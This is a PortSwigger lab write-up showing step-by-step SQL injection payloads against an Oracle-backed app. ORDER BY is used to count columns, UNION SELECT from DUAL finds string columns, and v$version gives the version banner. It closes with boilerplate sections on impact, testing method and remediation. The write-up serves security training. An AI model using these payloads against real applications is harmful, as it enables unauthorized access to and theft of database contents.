# Querying the database type and version on Oracle

**STEP #1**

Determine the number of columns returned from the original query.

```text
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

```text
' ORDER BY 3--  -> Returns an error message "Internal Server Error"
```

**Therefore the number of columns returned by the original query is 2**

**STEP #2**

Discover the column which contains data type string.

{% hint style="info" %}
💡 **NOTE
In Oracle databases, every SELECT statement must include a FROM attribute. So, injecting an **`' UNION SELECT NULL`**produces an error regardless of the number of columns. You can satisfy this requirement by providing a globally accessible table **`DUAL`**.**
{% endhint %}


```text
' UNION SELECT 'a', NULL FROM DUAL-- → Returns status code 200
' UNION SELECT 'a', 'a' FROM DUAL--  → Returns status code 200
```

**Therefore column 1 and 2 both contain data type string.**

We can use either column 1 or 2 to retrieve the database type and version.

**STEP #3**

Querying the Oracle database to retrieve database type and version.

```text
' UNION SELECT banner, NULL FROM v$version--
```

### Why It Works

The vulnerability exists because the application processes user-controlled input without adequate security validation. In this specific lab, the attack succeeds because:

- The application trusts the user input without proper server-side validation
- The input reaches a sensitive operation (database query, HTML rendering, system command, etc.) without sanitization
- The security boundary that should protect the operation is missing or incorrectly implemented
- The specific payload used exploits the exact weakness in the application's input handling

The PortSwigger lab description confirms this: "This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query."

### Attack Flow

**Attack Flow:**

```
Attacker Input (payload in request)
        ↓
Application Functionality (processes user input)
        ↓
Server Processing (no validation/sanitization)
        ↓
Injection Point (input reaches sensitive operation)
        ↓
Exploitation (payload executes as intended)
        ↓
Lab Objective Achieved
```

### Real-World Impact

An attacker could extract all database contents (user credentials, personal data, payment cards), bypass authentication, modify database contents, execute OS commands, access other databases on the same server, or cause denial of service.

### Detection / Testing Methodology

1. Identify all input points that interact with the database (search, login, product filters, URL parameters)
2. Test with single quotes (') and SQL-specific characters to detect syntax errors
3. Test for boolean-based blind injection (AND 1=1 vs AND 1=2)
4. Test for time-based blind injection (SLEEP/WAITFOR DELAY)
5. Test for UNION injection by determining column count (ORDER BY)
6. Identify the database type via version-specific syntax
7. Use sqlmap for automated extraction

### Remediation

- Use parameterized queries (prepared statements) for ALL database access
- Use stored procedures with parameterized inputs
- Implement input validation (type, length, format) as defense-in-depth
- Apply least-privilege database accounts (no DROP, xp_cmdshell, or admin access)
- Disable database error messages in production
- Use a Web Application Firewall (WAF) as additional protection

### Key Takeaways

- This lab demonstrates a sql injection vulnerability in a real-world scenario.
- The vulnerability occurs because user input reaches a sensitive operation without proper validation.
- The PortSwigger lab confirms: "This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION "
- Burp Suite is essential for identifying and exploiting this vulnerability.
- The remediation for this specific vulnerability involves: - Use parameterized queries (prepared statements) for ALL database access
